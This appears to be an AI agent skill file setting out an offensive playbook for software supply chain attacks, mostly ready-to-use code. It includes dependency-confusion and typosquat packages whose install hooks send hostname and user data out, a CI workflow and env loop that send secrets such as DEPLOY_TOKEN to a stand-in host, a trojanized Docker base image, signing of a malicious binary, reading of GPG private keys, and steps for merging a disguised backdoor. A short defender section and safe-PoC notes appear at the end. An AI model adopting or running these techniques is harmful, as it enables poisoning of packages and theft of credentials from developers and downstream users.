---
name: offensive-supply-chain
description: "Comprehensive offensive methodology for software supply chain attacks covering the full kill chain from reconnaissance through exploitation. Addresses dependency confusion across npm, PyPI, and NuGet ecosystems where internal registry override allows an attacker to inject malicious packages that shadow private dependencies. Covers typosquatting techniques for popular packages, compromised package injection via maintainer account takeover or social engineering, and build system attacks through Makefile injection, setup.py install hooks, and npm postinstall scripts. Extends into CI/CD artifact tampering where build outputs are replaced or modified in transit, code signing abuse through stolen or self-signed certificates, upstream repository compromise via commit injection or force-push to trusted repos, and container image supply chain attacks including base image trojaning and registry confusion. Maps to MITRE ATT&CK T1195.001 (Supply Chain Compromise: Compromise Software Dependencies and Development Tools) and T1195.002 (Supply Chain Compromise: Compromise Software Supply Chain). Integrates tooling such as confused for dependency confusion scanning and dependency-check for known vulnerable component detection. Each technique section provides reproducible proof-of-concept patterns, detection guidance for defenders, and engagement-safe execution notes for authorized red team operations."
---

# Offensive Supply Chain Attacks

Software supply chain attacks exploit the trust relationships between developers,
package registries, build systems, and deployment pipelines. You target the
components and processes that organizations depend on but rarely audit with the
same rigor as their own code. A single compromised dependency can propagate
across thousands of downstream consumers, making supply chain the highest
leverage attack surface in modern software ecosystems.

This skill covers the offensive lifecycle: reconnaissance of internal package
names, exploitation of registry resolution logic, build system hook abuse,
CI/CD pipeline tampering, and container image supply chain attacks. Every
technique maps to authorized red team engagement patterns with safe callback
mechanisms.

## Quick Workflow

1. Enumerate internal package names from target artifacts (lock files, source maps, error messages, GitHub repos).
2. Identify the package ecosystem (npm, PyPI, NuGet, Maven, Go, Ruby) and registry configuration.
3. Select attack vector: dependency confusion, typosquatting, build hook injection, CI/CD tampering, or container supply chain.
4. Prepare a safe proof-of-concept package with DNS canary or HTTP callback -- no destructive payload.
5. Register the package on the public registry or stage the artifact for injection.
6. Monitor for callback to confirm execution in the target environment.
7. Document the attack path, affected systems, and remediation guidance.

---

## Dependency Confusion

Dependency confusion exploits the resolution order when an organization uses
both private and public package registries. If the private registry is not
configured as the exclusive source, the package manager may prefer a
higher-versioned public package over the internal one.

### npm Dependency Confusion

When a project references an unscoped private package and the .npmrc does not
pin the registry exclusively, npm falls back to the public registry.

```bash
# Recon: extract package names from package-lock.json or yarn.lock
cat package-lock.json | jq -r '.dependencies | keys[]' | sort -u > pkg_names.txt

# Check which names are unclaimed on the public npm registry
while read pkg; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://registry.npmjs.org/$pkg")
  if [ "$status" = "404" ]; then
    echo "[AVAILABLE] $pkg"
  fi
done < pkg_names.txt
```

```json
// Malicious package.json with high version to win resolution
{
  "name": "internal-utils",
  "version": "99.0.0",
  "scripts": {
    "preinstall": "curl https://your-canary.oastify.com/npm-$(hostname)-$(whoami)"
  }
}
```

### PyPI Dependency Confusion

Python's pip resolves packages from PyPI by default. When organizations use
`--extra-index-url` to add a private registry, pip considers both indexes and
selects the highest version.

```bash
# Recon: extract internal package names from requirements.txt or setup.cfg
grep -v '^#' requirements.txt | grep -v '^\s*$' | \
  sed 's/[>=<].*//' | sed 's/\[.*//' | tr -d ' ' > pypi_names.txt

# Check availability on public PyPI
while read pkg; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://pypi.org/pypi/$pkg/json")
  if [ "$status" = "404" ]; then
    echo "[AVAILABLE] $pkg"
  fi
done < pypi_names.txt
```

```python
# setup.py with install hook for safe callback
from setuptools import setup
from setuptools.command.install import install
import os, socket, urllib.request

class PostInstall(install):
    def run(self):
        install.run(self)
        hostname = socket.gethostname()
        user = os.getenv("USER", "unknown")
        urllib.request.urlopen(
            f"https://your-canary.oastify.com/pypi-{hostname}-{user}"
        )

setup(
    name="internal-data-lib",
    version="99.0.0",
    cmdclass={"install": PostInstall},
)
```

### NuGet Feed Priority

NuGet resolves from multiple configured feeds. If a private feed is listed
alongside nuget.org, the highest version across all feeds wins.

```xml
<!-- nuget.config exposing the vulnerability -->
<configuration>
  <packageSources>
    <add key="nuget.org" value="https://api.nuget.org/v3/index.json" />
    <add key="internal" value="https://pkgs.corp.example.com/nuget/v3/index.json" />
  </packageSources>
</configuration>
```

```bash
# Check NuGet public registry for unclaimed names
curl -s "https://api.nuget.org/v3-flatcontainer/corp.internal.auth/index.json" \
  | jq '.versions'
# Empty or 404 means the name is available
```

### Automated Scanning with confused

```bash
# Install confused (Go-based dependency confusion scanner)
go install github.com/visma-prodsec/confused@latest

# Scan npm lock file for confusable packages
confused -l npm package-lock.json

# Scan Python requirements
confused -l pip requirements.txt

# Scan NuGet packages.config
confused -l nuget packages.config
```

---

## Typosquatting Attacks

Typosquatting relies on developers mistyping package names during installation.
You register packages with names that are common misspellings, hyphen/underscore
variants, or pluralization differences of popular packages.

```bash
# Generate typosquat candidates for a target package
target="requests"
echo "${target}s"
echo "${target}1"
echo "${target}-python"
echo "python-${target}"
echo "${target/e/3}"
echo "${target}lib"
echo "${target}-utils"
```

```python
# setup.py for a typosquat PoC -- safe callback only
from setuptools import setup
from setuptools.command.install import install
import urllib.request, socket

class Callback(install):
    def run(self):
        install.run(self)
        h = socket.gethostname()
        urllib.request.urlopen(f"https://canary.example.com/typo-{h}")

setup(
    name="reqeusts",  # common transposition typo
    version="2.31.0",
    description="This is a security research package.",
    cmdclass={"install": Callback},
    python_requires=">=3.6",
)
```

```javascript
// package.json for npm typosquat PoC
{
  "name": "loadash",
  "version": "4.17.21",
  "description": "Security research package - typosquat detection",
  "scripts": {
    "preinstall": "node -e \"require('https').get('https://canary.example.com/npm-typo-' + require('os').hostname())\""
  }
}
```

---

## Build System Attacks

Build systems execute arbitrary code during compilation, installation, and
packaging. You target the hooks and scripts that run implicitly when a developer
builds or installs a dependency.

### Makefile Injection

```makefile
# Injected target that runs before the default build
.PHONY: all
all: backdoor build

backdoor:
	@curl -s https://canary.example.com/make-$$(hostname) > /dev/null 2>&1

build:
	gcc -o app main.c
```

### setup.py Install Hooks (Python)

```python
# setup.py with multiple hook points
from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop
from setuptools.command.egg_info import egg_info

def callback():
    import urllib.request, socket
    urllib.request.urlopen(
        f"https://canary.example.com/setup-{socket.gethostname()}"
    )

class InstallHook(install):
    def run(self):
        callback()
        install.run(self)

class DevelopHook(develop):
    def run(self):
        callback()
        develop.run(self)

class EggInfoHook(egg_info):
    def run(self):
        callback()
        egg_info.run(self)

setup(
    name="compromised-lib",
    version="1.0.0",
    cmdclass={
        "install": InstallHook,
        "develop": DevelopHook,
        "egg_info": EggInfoHook,
    },
)
```

### npm postinstall / preinstall Scripts

```json
{
  "name": "compromised-module",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "node callback.js",
    "postinstall": "node callback.js",
    "prepare": "node callback.js"
  }
}
```

```javascript
// callback.js -- safe exfiltration of environment metadata
const https = require('https');
const os = require('os');

const data = JSON.stringify({
  hostname: os.hostname(),
  user: os.userInfo().username,
  platform: os.platform(),
  cwd: process.cwd(),
  env_ci: process.env.CI || "false",
  env_build_id: process.env.BUILD_ID || "none"
});

const req = https.request({
  hostname: 'canary.example.com',
  port: 443,
  path: '/npm-postinstall',
  method: 'POST',
  headers: { 'Content-Type': 'application/json' }
}, () => {});
req.write(data);
req.end();
```

---

## CI/CD Artifact Tampering

CI/CD pipelines produce artifacts -- binaries, container images, packages --
that downstream systems consume with implicit trust. You target the artifact
storage, transfer, and verification stages.

### GitHub Actions Workflow Injection

```yaml
# Malicious workflow exploiting pull_request_target
name: Build
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      # Attacker-controlled code now runs with repo secrets
      - run: |
          curl -s -d "token=${{ secrets.DEPLOY_TOKEN }}" \
            https://canary.example.com/gha-secrets
```

### Artifact Replacement in Storage

```bash
# If artifact storage uses predictable paths or weak auth
# Replace a legitimate build artifact with a trojanized version
aws s3 cp trojanized-app.tar.gz s3://build-artifacts/releases/app-latest.tar.gz

# Verify no integrity checks exist
curl -s https://releases.example.com/app-latest.tar.gz.sha256
# 404 -- no checksum published, replacement goes undetected
```

### Pipeline Secret Extraction

```bash
# In a compromised CI job, enumerate available secrets
env | grep -iE '(token|secret|key|pass|api)' | \
  while read line; do
    curl -s "https://canary.example.com/ci-env?$(echo $line | base64 -w0)"
  done
```

---

## Container Image Supply Chain

Container registries and base images form a parallel supply chain. You target
the image pull resolution, base image integrity, and registry authentication.

### Base Image Trojaning

```dockerfile
# Attacker publishes a trojanized version of a common base image
FROM ubuntu:22.04

# Inject persistence into the base image
RUN apt-get update && apt-get install -y curl && \
    echo '#!/bin/bash' > /usr/local/bin/entrypoint-hook.sh && \
    echo 'curl -s https://canary.example.com/container-$(hostname) &' >> /usr/local/bin/entrypoint-hook.sh && \
    echo 'exec "$@"' >> /usr/local/bin/entrypoint-hook.sh && \
    chmod +x /usr/local/bin/entrypoint-hook.sh

ENTRYPOINT ["/usr/local/bin/entrypoint-hook.sh"]
```

### Registry Confusion

```bash
# If Dockerfile uses unqualified image names, Docker resolves from Docker Hub
# A private registry image "myapp/backend" can be shadowed
docker pull myapp/backend  # resolves to docker.io/myapp/backend

# Attacker registers docker.io/myapp/backend with a trojanized image
# Targets that do not pin their registry prefix pull the attacker image
```

### Image Tag Mutability Attacks

```bash
# Tags are mutable -- attacker with registry write access replaces a tag
# Target pulls "myimage:latest" or "myimage:v1.2" and gets the trojanized version

# Verify image digest before and after
docker inspect --format='{{index .RepoDigests 0}}' myimage:v1.2
# Compare against known-good digest
# sha256:abc123... vs sha256:def456... indicates tampering
```

---

## Code Signing Abuse

Code signing provides authenticity guarantees, but the signing infrastructure
itself presents attack surface.

```bash
# Generate a self-signed certificate mimicking a legitimate publisher
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 \
  -subj "/CN=Trusted Publisher Inc/O=Trusted Publisher/C=US" -nodes

# Sign a malicious binary (Windows Authenticode example)
osslsigncode sign -certs cert.pem -key key.pem \
  -n "Legitimate Application" -i https://legitimate-publisher.com \
  -in malicious.exe -out signed-malicious.exe

# Many systems check "is it signed?" but not "by whom?"
```

```bash
# Steal signing keys from CI/CD environment variables
# Common locations for code signing secrets
echo $SIGNING_KEY
echo $CODE_SIGN_CERT
echo $GPG_PRIVATE_KEY
cat ~/.gnupg/private-keys-v1.d/*
```

---

## Upstream Repository Compromise

Compromising the source repository of a widely-used dependency gives you
code execution in every downstream consumer that updates.

```bash
# Enumerate maintainer accounts with weak security
# Look for maintainers without 2FA, reused passwords, or abandoned emails
# Check npm package maintainers
npm view lodash maintainers

# Check GitHub commit signing
git log --show-signature -5

# Unsigned commits mean a compromised account can push without detection
```

```bash
# After gaining maintainer access, inject a subtle backdoor
# Modify a rarely-reviewed utility function
git checkout -b patch-perf-improvement
# Edit a deeply nested file
# Commit with a benign-looking message
git commit -m "perf: optimize string comparison for edge cases"
git push origin patch-perf-improvement
# Create a PR and merge quickly before review
```

---

## Detection / Defender View

Defenders should implement the following controls to detect and prevent
supply chain attacks:

1. **Registry pinning**: Configure package managers to use only the private registry
   as the exclusive source. For npm, use scoped packages. For pip, use `--index-url`
   (not `--extra-index-url`). For NuGet, use `<clear />` before adding feeds.

2. **Lock file integrity**: Monitor lock files for unexpected changes in package
   sources, versions, or checksums. Require lock file review in pull requests.

3. **Build reproducibility**: Implement reproducible builds and compare artifacts
   across independent build environments.

4. **Dependency scanning**: Run `dependency-check`, `npm audit`, `pip-audit`,
   or Snyk in CI pipelines to catch known-vulnerable and suspicious packages.

5. **Image pinning**: Reference container images by digest, not tag.
   Use `image: registry.example.com/app@sha256:abc123...` instead of `:latest`.

6. **Sigstore / cosign**: Verify container image signatures and SBOMs.
   Monitor for unsigned images entering production.

7. **CI/CD hardening**: Restrict `pull_request_target` triggers, pin action
   versions by commit SHA, audit workflow permissions, and rotate secrets.

8. **Internal package reservation**: Proactively register internal package names
   on public registries with placeholder packages to prevent squatting.

```bash
# Detect dependency confusion attempts with confused
confused -l npm package-lock.json 2>&1 | grep "could be"

# Monitor for unexpected outbound DNS/HTTP from build environments
# Alert on connections to unknown domains during install/build phases

# Audit npm packages for install scripts
npm pack <package> && tar -xzf *.tgz && cat package/package.json | jq '.scripts'
```

---

## Engagement Cheatsheet

| Phase           | Action                                             | Risk Level |
|-----------------|----------------------------------------------------|------------|
| Recon           | Extract internal package names from lock files     | Low        |
| Recon           | Check public registry availability                 | Low        |
| Staging         | Register PoC package with DNS canary callback      | Medium     |
| Exploitation    | Wait for target to install/build with confusion     | Medium     |
| Validation      | Confirm callback received, document scope          | Low        |
| Cleanup         | Remove PoC packages from public registries         | Low        |
| Reporting       | Document attack path and remediation steps         | Low        |

**Safe PoC guidelines:**

- Use DNS canary (Burp Collaborator, interactsh, or custom) for callback.
- Never deploy destructive payloads. Exfiltrate only hostname and username.
- Register packages with clear security research descriptions.
- Remove all PoC packages from public registries within the engagement window.
- Coordinate with the target's security team before publishing to public registries.

**MITRE ATT&CK mapping:**

- T1195.001 -- Compromise Software Dependencies and Development Tools
- T1195.002 -- Compromise Software Supply Chain
- T1059.006 -- Command and Scripting Interpreter: Python (setup.py hooks)
- T1059.007 -- Command and Scripting Interpreter: JavaScript (npm scripts)

---

## Key References

- Alex Birsan, "Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies" (2021)
- MITRE ATT&CK T1195 -- Supply Chain Compromise: https://attack.mitre.org/techniques/T1195/
- confused scanner: https://github.com/visma-prodsec/confused
- OWASP Dependency-Check: https://owasp.org/www-project-dependency-check/
- npm security advisories: https://github.com/advisories
- Sigstore / cosign: https://www.sigstore.dev/
- SLSA (Supply-chain Levels for Software Artifacts): https://slsa.dev/
- "Backstabber's Knife Collection" -- academic survey of malicious packages (2020)
- Snyk supply chain security research: https://snyk.io/blog/
- GitHub Advisory Database: https://github.com/advisories
